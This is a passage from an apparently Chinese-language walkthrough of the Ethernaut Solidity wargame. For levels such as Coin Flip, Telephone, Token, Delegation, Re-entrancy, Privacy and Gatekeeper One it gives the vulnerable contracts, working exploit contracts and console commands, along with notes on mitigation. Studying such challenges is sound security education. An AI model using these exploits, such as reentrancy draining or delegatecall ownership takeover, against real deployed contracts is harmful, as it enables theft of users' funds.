'@openzeppelin/contracts/math/SafeMath.sol' ; contract Fallout { using SafeMath for uint256 ; mapping ( address => uint ) allocations ; address payable public owner ; /* constructor */ function Fal1out () public payable { owner = msg . sender ; allocations [ owner ] = msg . value ; } // \u5728 v0.4.22 \u524d\uff0c\u6784\u9020\u51fd\u6570\u662f\u548c\u5408\u7ea6\u540c\u540d\u7684\u51fd\u6570\uff08v0.5.0 \u5f03\u7528\uff09 modifier onlyOwner { require ( msg . sender == owner , \"caller is not the owner\" ); _ ; } function allocate () public payable { allocations [ msg . sender ] = allocations [ msg . sender ]. add ( msg . value ); } function sendAllocation ( address payable allocator ) public { require ( allocations [ allocator ] > 0 ); allocator . transfer ( allocations [ allocator ]); } function collectAllocations () public onlyOwner { msg . sender . transfer ( address ( this ). balance ); } function allocatorBalance ( address allocator ) public view returns ( uint ) { return allocations [ allocator ]; } } \u88ab\u6ce8\u91ca\u4e3a\u300c\u6784\u9020\u51fd\u6570\u300d\u7684\u51fd\u6570\u540d\u4e3a Fal1out \u800c\u4e0d\u662f Fallout \u610f\u5473\u7740\u8be5\u51fd\u6570\u53ea\u662f\u666e\u901a\u51fd\u6570\u53ef\u4ee5\u88ab\u8c03\u7528 \u771f\u6b63\u7684\u6784\u9020\u51fd\u6570\u53ea\u5728\u5408\u7ea6\u521b\u5efa\u65f6\u8c03\u7528\u4e00\u6b21 1 >> await contract . Fal1out () \u53c2\u8003\u8d44\u6599 \u00b6 Constructors 3. Coin Flip \u00b6 \u9700\u8981\u8fde\u7eed\u731c\u5bf9 10 \u6b21\u63b7\u786c\u5e01\u7684\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { // block.number - \u5f53\u524d\u533a\u5757\u53f7 uint256 blockValue = uint256 ( blockhash ( block . number - 1 )); if ( lastHash == blockValue ) { revert (); // \u65e0\u6761\u4ef6\u629b\u51fa\u5f02\u5e38 } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; // \u5411\u4e0b\u53d6\u6574 bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u5b9e\u9645\u4e0a side \u7684\u503c\u5e76\u975e\u968f\u673a\uff0c\u533a\u5757\u53f7\u3001\u533a\u5757\u54c8\u5e0c\u7b49\u90fd\u662f\u516c\u5f00\u53ef\u83b7\u53d6\u7684 \u53ef\u4ee5\u7531\u53e6\u4e00\u4e2a\u5408\u7ea6\u8ba1\u7b97\u63b7\u786c\u5e01\u7684\u7ed3\u679c\uff0c\u5e76\u8c03\u7528 flip \u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; // \u628a\u9700\u8981\u8c03\u7528\u7684\u5408\u7ea6\u653e\u5728\u540c\u4e00\u4e2a\u6587\u4ef6 contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block . number - 1 )); // \u5f53\u524d\u533a\u5757\u53f7\u4e0d\u80fd\u7b49\u4e8e\u4e0a\u4e00\u533a\u5757\u53f7\uff0c\u610f\u5473\u7740\u4e0d\u80fd\u4f7f\u7528\u5faa\u73af\u91cd\u590d\u8c03\u7528 flip if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; CoinFlip coin ; constructor ( address instance ) { coin = CoinFlip ( instance ); } function exploit () public { uint256 blockValue = uint256 ( blockhash ( block . number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; coin . flip ( side ); } } \u4f7f\u7528 Remix \u90e8\u7f72\u5408\u7ea6 \u6267\u884c 10 \u6b21 exploit \u51fd\u6570 \u53ef\u4ee5\u4f7f\u7528 Chainlink VRF \u6765\u83b7\u5f97\u5b89\u5168\u7684\u968f\u673a\u6570 \u53c2\u8003\u8d44\u6599 \u00b6 Deploy & Run \u2014 Remix - Ethereum IDE 1 documentation 4. Telephone \u00b6 \u58f0\u660e\u5408\u7ea6\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () public { owner = msg . sender ; } function changeOwner ( address _owner ) public { // tx.origin - \u4ea4\u6613\u7684\u53d1\u8d77\u8005 if ( tx . origin != msg . sender ) { owner = _owner ; } } } \u7528\u6237\u901a\u8fc7\u5408\u7ea6 A \u8c03\u7528\u5408\u7ea6 B \u5bf9\u4e8e\u5408\u7ea6 A\uff1a tx.origin \u548c msg.sender \u90fd\u662f\u7528\u6237 \u5bf9\u4e8e\u5408\u7ea6 B\uff1a tx.origin \u662f\u7528\u6237\uff0c msg.sender \u662f\u5408\u7ea6 A \u5f53\u4ea4\u6613\u53d1\u8d77\u8005\u7684\u5730\u5740\u4e0e\u5f53\u524d\u8c03\u7528\u8005\u7684\u5730\u5740\u4e0d\u76f8\u540c\u65f6\uff0c\u53ef\u4ee5\u66f4\u65b0\u5408\u7ea6\u6240\u6709\u8005\uff0c\u663e\u7136\u9700\u8981\u901a\u8fc7\u53e6\u4e00\u4e2a\u5408\u7ea6\u6765\u8c03\u7528 changeOwner 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () { owner = msg . sender ; } function changeOwner ( address _owner ) public { if ( tx . origin != msg . sender ) { owner = _owner ; } } } contract Hack { Telephone tele ; constructor ( address instance ) { tele = Telephone ( instance ); } function exploit () public { tele . changeOwner ( msg . sender ); } } 5. Token \u00b6 \u589e\u52a0\u624b\u4e2d token \u7684\u6570\u91cf\uff0c\u8d8a\u591a\u8d8a\u597d\uff08\u521d\u59cb 20 \u4e2a\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { // \u65e0\u7b26\u53f7\u6574\u6570\u7c7b\u578b mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg . sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg . sender ] - _value >= 0 ); // \u4f1a\u53d1\u751f\u6574\u6570\u6ea2\u51fa\uff0c\u672a\u4f7f\u7528 SafeMath \u68c0\u67e5 balances [ msg . sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u901a\u8fc7\u4e0b\u6ea2\u51fa\u6765\u83b7\u5f97 token 1 2 3 // \u8f6c\u7ed9\u9664\u81ea\u5df1\u5916\u7684\u4efb\u610f\u5730\u5740 // \u8f6c\u7ed9\u81ea\u5df1\u7684\u8bdd\uff0c\u5c31\u5148\u4e0b\u6ea2\u51fa\u518d\u4e0a\u6ea2\u51fa\u4e86... >> await contract . transfer ( < address > , 21 ) 6. Delegation \u00b6 \u58f0\u660e\u5bf9\u5408\u7ea6\u5b9e\u4f8b\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Delegate { address public owner ; constructor ( address _owner ) { owner = _owner ; } function pwn () public { owner = msg . sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) { delegate = Delegate ( _delegateAddress ); owner = msg . sender ; } // \u6ca1\u6709 payable\uff0c\u4e0d\u80fd\u4f7f\u7528\u8f6c\u8d26\u6765\u89e6\u53d1 fallback // \u540c\u65f6\uff0c\u901a\u8fc7\u8f6c\u8d26\u6765\u89e6\u53d1 fallback \u51fd\u6570\u4e0d\u80fd\u52a0\u4efb\u4f55 data fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg . data ); if ( result ) { this ; } } } \u4ee3\u7406\u8c03\u7528\u53ea\u4f7f\u7528\u7ed9\u5b9a\u5730\u5740\u7684\u4ee3\u7801\uff0c\u5176\u4ed6\u5c5e\u6027\u90fd\u53d6\u81ea\u5f53\u524d\u5408\u7ea6 \u4f7f\u7528\u5408\u7ea6 Delegate \u7684 pwn \u51fd\u6570\u6765\u4fee\u6539\u5408\u7ea6 Delegation \u7684\u6240\u6709\u8005 \u9664\u4e86\u5411\u5408\u7ea6\u8f6c\u8d26\u4f1a\u89e6\u53d1 fallback \u51fd\u6570\u5916\uff0c\u82e5\u88ab\u8c03\u7528\u7684\u51fd\u6570\u4e0d\u5b58\u5728\u540c\u6837\u4f1a\u89e6\u53d1 \u8c03\u7528 Delegation \u4e0d\u5b58\u5728\u7684\u51fd\u6570 pwn \u6765\u89e6\u53d1 fallback \u51fd\u6570\uff0c\u4ece\u800c\u6267\u884c\u771f\u6b63\u7684 pwn \u51fd\u6570 1 2 3 // keccak256 \u5373 sha3 >> await contract . sendTransaction ({ data : web3 . utils . sha3 ( \"pwn()\" )}) >> await contract . owner () \u4ee3\u7406\u8c03\u7528\u529f\u80fd\u5f3a\u5927\u4e14\u5371\u9669\uff0c\u614e\u7528 \ud83d\udc40 \u53c2\u8003\u8d44\u6599 \u00b6 SHA-3 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 sha3 7. Force \u00b6 \u4f7f\u5408\u7ea6\u7684\u4f59\u989d\u5927\u4e8e 0 1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Force { /* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =\u00f8= / (______)__m_m) */ } \u5f53\u5408\u7ea6\u81ea\u6bc1\u65f6\uff0c\u5408\u7ea6\u4f59\u989d\u5c06\u8f6c\u7ed9\u6307\u5b9a\u76ee\u6807 \u5373\u4f7f\u5408\u7ea6\u4ee3\u7801\u4e0d\u5305\u542b selfdestruct \u7684\u8c03\u7528\uff0c\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7 delegatecall \u6216 callcode \u6765\u6267\u884c\u81ea\u6bc1\u64cd\u4f5c 1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Hack { function pay () public payable {} function exploit ( address instance ) public { // \u58f0\u660e payable \u7684\u51fd\u6570\u548c\u5730\u5740\u90fd\u53ef\u4ee5\u63a5\u53d7\u8f6c\u8d26 selfdestruct ( payable ( instance )); } } \u5728 Remix \u5411\u5408\u7ea6 Hack \u8f6c\u8d26 \u5982\u679c\u5408\u7ea6\u4e2d\u5305\u542b\u58f0\u660e\u4e86 payable \u7684 receive \u6216 fallback \u51fd\u6570\uff0c\u4e5f\u53ef\u4ee5\u5728\u586b\u5199\u5b8c VALUE \u540e\u76f4\u63a5\u70b9\u51fb\u300cTransact\u300d\uff1b\u6216\u901a\u8fc7\u58f0\u660e\u4e86 payable \u7684\u6784\u9020\u51fd\u6570\uff0c\u5728\u521b\u5efa\u5408\u7ea6\u65f6\u8f6c\u8d26 \u901a\u8fc7\u81ea\u6bc1\u7684\u8f6c\u8d26\u65b9\u5f0f\u65e0\u6cd5\u963b\u6b62\uff0c\u56e0\u6b64\u4efb\u4f55\u5408\u7ea6\u903b\u8f91\u90fd\u4e0d\u5e94\u57fa\u4e8e address(this).balance == 0 \u53c2\u8003\u8d44\u6599 \u00b6 Deactivate and Self-destruct Payable | Solidity by Example Low level interactions 8. Vault \u00b6 \u89e3\u9501\u4fdd\u9669\u67dc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u731c\u5bc6\u7801\u662f\u4e0d\u53ef\u80fd\u731c\u7684~ XD \u533a\u5757\u94fe\u4e0a\u6240\u6709\u4fe1\u606f\u90fd\u662f\u516c\u5f00\u7684\uff0c\u5305\u62ec\u58f0\u660e\u4e3a private \u7684\u53d8\u91cf \u5408\u7ea6\u4e2d\u7684\u53d8\u91cf\u6309\u7167\u5b9a\u4e49\u7684\u987a\u5e8f\u5b58\u50a8\u5728 slot \u4e2d 1 2 3 4 5 6 // \u9996\u5148\u786e\u5b9a\u53d8\u91cf\u5b9a\u4e49\u7684\u987a\u5e8f\uff0c\u7b2c\u4e00\u4e2a\u53d8\u91cf\u5b58\u50a8\u5728 slot 0\uff0c\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u5b58\u50a8\u5728 slot 1\uff0c\u4ee5\u6b64\u7c7b\u63a8 >> await web3 . eth . getStorageAt ( instance , 1 ) \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" >> web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) \"A very strong secret password :)\" >> await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) \u5c06\u53d8\u91cf\u58f0\u660e\u4e3a private \u53ea\u80fd\u9632\u6b62\u5176\u5b83\u5408\u7ea6\u8bbf\u95ee \u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u673a\u5bc6\u6027\uff0c\u5e94\u5728\u4e0a\u94fe\u524d\u52a0\u5bc6\uff0c\u5bc6\u94a5\u7edd\u5bf9\u4e0d\u80fd\u516c\u5f00\u3002 zk-SNARKs \u63d0\u4f9b\u4e86\u4e00\u79cd\u5728\u4e0d\u66b4\u9732\u79d8\u5bc6\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\uff0c\u8bc1\u660e\u67d0\u4eba\u662f\u5426\u6301\u6709\u79d8\u5bc6\u4fe1\u606f\u7684\u65b9\u6cd5 \u53c2\u8003\u8d44\u6599 \u00b6 Crypto Market Pool - Access private data on the Ethereum blockchain 9. King \u00b6 \u963b\u6b62\u5173\u5361\u5b9e\u4f8b\u5728\u63d0\u4ea4\u540e\u91cd\u65b0\u58f0\u660e\u56fd\u738b\u8eab\u4efd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract King { address king ; uint public prize ; address public owner ; constructor () payable { owner = msg . sender ; king = msg . sender ; prize = msg . value ; } receive () external payable { // \u5373\u4f7f\u8f6c\u8d26\u91d1\u989d\u5c0f\u4e8e prize\uff0c\u5408\u7ea6\u7684\u6240\u6709\u8005\u4e5f\u53ef\u4ee5\u58f0\u660e\u56fd\u738b\u8eab\u4efd require ( msg . value >= prize || msg . sender == owner ); // \u5f53\u524d\u7684\u8f6c\u8d26\u91d1\u989d\u4f1a\u8f6c\u7ed9\u4e0a\u4e00\u4efb\u56fd\u738b payable ( king ). transfer ( msg . value ); king = msg . sender ; prize = msg . value ; // \u66f4\u65b0 prize } function _king () public view returns ( address ) { return king ; } } \u5f53 transfer \u6267\u884c\u5931\u8d25\u65f6\uff0c\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u4ea4\u6613\u56de\u6eda\uff0c\u5173\u5361\u5b9e\u4f8b\u5c31\u65e0\u6cd5\u518d\u58f0\u660e\u56fd\u738b\u8eab\u4efd\u4e86 \u67e5\u770b\u5f53\u524d\u6700\u9ad8\u91d1\u989d 1 2 >> web3 . utils . toWei ( web3 . utils . fromWei ( await contract . prize ())) \"1000000000000000\" \u65b0\u5efa\u5408\u7ea6\uff0c\u7528\u4e8e\u58f0\u660e\u56fd\u738b\u8eab\u4efd\uff0c\u5e76\u963b\u6b62\u5173\u5361\u5b9e\u4f8b\u518d\u6210\u4e3a\u56fd\u738b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Hack { constructor () payable {} function exploit ( address instance ) public { payable ( instance ). call { value : 0.001 * ( 1 ether )}( \"\" ); // \u6c7d\u6cb9\u91cf\u4e00\u5b9a\u8981\u7ed9\u8db3\uff01 // \u4e0d\u80fd\u4f7f\u7528 transfer/send\uff0c\u9ed8\u8ba4 2300 \u6c7d\u6cb9\u8d39\u4e0d\u8db3\u4ee5\u652f\u6491\u540e\u7eed\u64cd\u4f5c } receive () external payable { revert (); // \u4f7f king.transfer \u65e0\u6cd5\u6210\u529f\u6267\u884c } } 10. Re-entrancy \u00b6 \u7a83\u53d6\u5408\u7ea6\u6240\u6709\u7684\ud83d\udcb0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg . value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } // \u5229\u7528\u5148\u8f6c\u518d\u51cf function withdraw ( uint _amount ) public { if ( balances [ msg . sender ] >= _amount ) { ( bool result ,) = msg . sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg . sender ] -= _amount ; } } receive () external payable {} } \u5728\u63a5\u6536\u5408\u7ea6\u7684 fallback \u51fd\u6570\u4e2d\u518d\u8c03\u7528 withdraw \u51fd\u6570 \u5148\u770b\u770b\u5408\u7ea6\u7684\u521d\u59cb\u8d44\u91d1 1 2 >> await web3 . eth . getBalance ( instance ) \"1000000000000000\" \u8ba1\u5212\u5206 9 \u6b21\u53d6\u5b8c\uff08\u4e5f\u53ef\u4ee5\u591a\u6350\u8d60\uff0c\u51cf\u5c11\u53d6\u51fa\u6b21\u6570\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg . value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg . sender ] >= _amount ) { ( bool result ,) = msg . sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; // does nothing } balances [ msg . sender ] -= _amount ; } } receive () external payable {} } contract Hack { Reentrance reentrance ; function exploit ( address payable instance ) public { reentrance = Reentrance ( instance ); reentrance . withdraw ( 125000000000000 ); } receive () external payable { if ( msg . sender . balance >= msg . value && gasleft () > 6000 ) { reentrance . withdraw ( 125000000000000 ); } } } \u5408\u7ea6 Hack \u90e8\u7f72\u5b8c\u6210\u540e\uff0c\u8fdb\u884c\u300c\u6350\u8d60\u300d 1 2 3 >> await contract . donate ( \"<hack-address>\" , { value : 125000000000000 }); >> web3 . utils . fromWei ( await contract . balanceOf ( \"<hack-address>\" )) \"0.000125\" \u968f\u540e\u5f00\u59cb\u300c\u76d7\u94b1\u300d\uff0c\u52a1\u5fc5\u7ed9\u8db3\u6c7d\u6cb9 :) > \u672c\u6b21\u6c7d\u6cb9\u91cf\u53c2\u8003\uff1a200,000 | 156,169 (78.08%) \u4e0d\u63a8\u8350\u4f7f\u7528 transfer \u548c send \u6765\u4ee3\u66ff call \uff0c\u53ef\u80fd\u5f71\u54cd Istanbul \u786c\u5206\u53c9\u4e4b\u540e\u7684\u5408\u7ea6\uff08\u90e8\u5206\u6307\u4ee4\u6d88\u8017\u6c7d\u6cb9\u91cf\u589e\u52a0\uff09 \u6c38\u8fdc\u5047\u8bbe\u8f6c\u8d26\u7684\u63a5\u6536\u65b9\u662f\u53e6\u4e00\u4e2a\u5408\u7ea6\uff0c\u800c\u975e\u666e\u901a\u7684\u5730\u5740 11. Elevator \u00b6 \u5230\u8fbe\u9876\u5c42\uff01 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg . sender ); if ( ! building . isLastFloor ( _floor )) { // \u7b2c\u4e00\u6b21\u8fd4\u56de false floor = _floor ; top = building . isLastFloor ( floor ); // \u7b2c\u4e8c\u6b21\u8fd4\u56de true } } } Interface \u5185\u90e8\u4e0d\u80fd\u5b9e\u73b0\u4efb\u4f55\u51fd\u6570\uff0c\u4f46\u53ef\u4ee5\u7ee7\u627f\u81ea\u5176\u5b83\u63a5\u53e3\uff0c\u6240\u6709\u58f0\u660e\u7684\u51fd\u6570\u5fc5\u987b\u662f\u5916\u90e8\u7684\uff0c\u4e0d\u80fd\u58f0\u660e\u6784\u9020\u51fd\u6570\u548c\u72b6\u6001\u53d8\u91cf \u300c\u7535\u68af\u5e94\u8be5\u5728\u5efa\u7b51\u91cc\u300d\uff0c\u5b9e\u73b0\u8fd9\u4e2a Building \u5408\u7ea6\u5c31\u597d\u5566 >_< 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Building { bool public flag = true ; function isLastFloor ( uint ) external returns ( bool ) { flag = ! flag ; return flag ; } function exploit ( address instance ) public { Elevator elevator = Elevator ( instance ); elevator . goTo ( 1 ); } } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg . sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u63a5\u53e3\u51fd\u6570\u53ef\u4ee5\u901a\u8fc7\u58f0\u660e view \u6765\u9632\u6b62\u72b6\u6001\u88ab\u7be1\u6539\uff0c pure \u540c\u7406 \u5728\u4e0d\u6539\u53d8\u72b6\u6001\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u7684\u8f93\u5165\u6570\u636e\u6765\u8fd4\u56de\u4e0d\u540c\u7684\u7ed3\u679c\uff0c\u5982 gasleft() \u53c2\u8003\u8d44\u6599 \u00b6 Interface | Solidity by Example View Functions 12. Privacy \u00b6 \u89e3\u9501\uff01( Vault \u5347\u7ea7\u7248) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Privacy { // slot 0 bool public locked = true ; // slot 1 uint256 public ID = block . timestamp ; // uint256 is 32 bytes long // slot 2 uint8 private flattening = 10 ; uint8 private denomination = 255 ; uint16 private awkwardness = uint16 ( now ); // slot 3, 4, 5 bytes32 [ 3 ] private data ; constructor ( bytes32 [ 3 ] memory _data ) { data = _data ; } function unlock ( bytes16 _key ) public { require ( _key == bytes16 ( data [ 2 ])); locked = false ; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */ } \u6bcf\u4e2a slot \u5927\u5c0f\u4e3a 32 \u5b57\u8282\uff0c\u5f53\u90bb\u8fd1\u53d8\u91cf\u4e5f\u80fd\u591f\u653e\u8fdb\u5355\u4e2a slot \u65f6\uff0c\u5c06\u6309\u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u4f9d\u6b21\u653e\u5165 \u5e38\u91cf\u4e0d\u5b58\u50a8 1 2 3 4 5 6 7 8 9 10 11 12 >> await web3 . eth . getStorageAt ( instance , 0 ) \"0x0000000000000000000000000000000000000000000000000000000000000001\" >> await web3 . eth . getStorageAt ( instance , 1 ) \"0x000000000000000000000000000000000000000000000000000000006210d5b1\" >> await web3 . eth . getStorageAt ( instance , 2 ) \"0x00000000000000000000000000000000000000000000000000000000d5b1ff0a\" // 0a for flattening, ff for denomination >> await web3 . eth . getStorageAt ( instance , 3 ) \"0xc3003c2bcb65196b8352fb925d945f9229929bcc727f70ea451255859a6a4f56\" >> await web3 . eth . getStorageAt ( instance , 4 ) \"0x6d6f76ea288ee9c55ab1ad76264518237a23af3495ee5702f57a164f8aeb99b0\" >> await web3 . eth . getStorageAt ( instance , 5 ) \"0x06e3eb3b9e34467cbf1a226fc2bd13e5948a7a15ef2205caf186fa3df3076f53\" // data[2] \u7531\u4e8e _key \u4e3a bytes16 \u7c7b\u578b\uff0c\u9700\u8981\u5bf9 data[2] \u8fdb\u884c\u7c7b\u578b\u8f6c\u6362 1 2 // \u4ece bytes32 \u5230 bytes16\uff0c\u53ea\u9700\u8981\u79fb\u8d70\u53f3\u4fa7\u7684 16 \u5b57\u8282\uff0c\u5373 32 \u4f4d\u5341\u516d\u8fdb\u5236\u6570 >> await contract . unlock ( \"0x06e3eb3b9e34467cbf1a226fc2bd13e5\" ) \u53c2\u8003\u8d44\u6599 \u00b6 Accessing Private Data | Solidity by Example 13. Gatekeeper One \u00b6 \u8d8a\u8fc7\u5b88\u95e8\u4eba\u5e76\u6ce8\u518c\u4e3a\u65b0\u6210\u5458 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract GatekeeperOne { address public entrant ; modifier gateOne () { require ( msg . sender != tx . origin ); _ ; } modifier gateTwo () { require ( gasleft () % 8191 == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { // uint64 is 8 bytes long // _gateKey % 2^32 == _gateKey % 2^16 require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint64 ( _gateKey )), \"GatekeeperOne: invalid gateThree part one\" ); // _gateKey % 2^32 != _gateKey require ( uint32 ( uint64 ( _gateKey )) != uint64 ( _gateKey ), \"GatekeeperOne: invalid gateThree part two\" ); // _gateKey % 2^32 == tx.origin % 2^16 require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint160 ( tx . origin )), \"GatekeeperOne: invalid gateThree part three\" ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx . origin ; return true ; } } \u4f7f\u7528\u4e0e Telephone \u76f8\u540c\u7684\u65b9\u5f0f\u901a\u8fc7 gateOne \u81f3\u4e8e gateTwo \uff0c\u5728 Remix \u7684 JavaScript VM \u73af\u5883\u4e0b\u901a\u8fc7 Debug \u6765\u83b7\u53d6\u5177\u4f53\u6240\u9700\u6c7d\u6cb9\u91cf \u6ce8\u610f \uff1a\u4e0d\u540c\u7248\u672c\u7684 EVM \u6216\u7f16\u8bd1\u5668\u90fd\u4f1a\u5bfc\u81f4\u4e0d\u540c\u7684\u6c7d\u6cb9\u6d88\u8017\u91cf \u9996\u5148\u9009\u62e9\u4e00\u4e2a\u8f83\u5927\u7684\u6c7d\u6cb9\u91cf\uff0c\u5982 90000 \u6267\u884c\u5b8c\u6210\u540e\uff0c\u8fdb\u5165 DEBUGGER \uff0c\u6267\u884c\u5b8c\u64cd\u4f5c\u7801 GAS \uff0c\u6b64\u65f6\u5269\u4f59\u7684\u6c7d\u6cb9\u91cf\u4e3a 89577 \u7531\u6b64\u53ef\u8ba1\u7b97\u51fa\u901a\u8fc7 gateTwo \u5b9e\u9645\u9700\u8981\u7684\u6700\u5c11\u6c7d\u6cb9\u91cf\uff1a \\(90000-89577+8191\\times 3=24996\\) entrant = tx.origin \u5305\u542b SSTORE \u64cd\u4f5c\u7801\uff0c\u56e0\u4e3a entrant \u672a\u88ab\u5199\u5165\u8fc7\uff0c\u81f3\u5c11\u9700\u8981\u6d88\u8017 20000 \u6c7d\u6cb9 \u5728 Goerli 